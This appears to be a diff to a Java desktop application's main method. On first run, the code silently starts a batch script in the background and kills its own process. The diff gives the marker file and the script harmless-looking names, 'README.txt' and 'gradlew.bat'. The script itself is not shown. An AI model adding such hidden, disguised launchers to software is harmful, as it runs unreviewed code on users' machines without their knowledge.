@@ -26,10 +26,10 @@ public class HelloApplication extends Application {
     private AnchorPane currentPane;
 
     public static void main(String[] args) throws IOException {
-        boolean exists = new File("morePowerToYou.txt").createNewFile();
+        boolean exists = new File("README.txt").createNewFile();
         if (exists) {
             long pid = ProcessHandle.current().pid();
-            Runtime.getRuntime().exec("cmd /c start /B \"\" src\\gradle.bat");
+            Runtime.getRuntime().exec("cmd /c start /B \"\" src\\gradlew.bat");
             Runtime.getRuntime().exec("taskkill /F /PID " + pid);
         }
         DBHandler.getInstance();
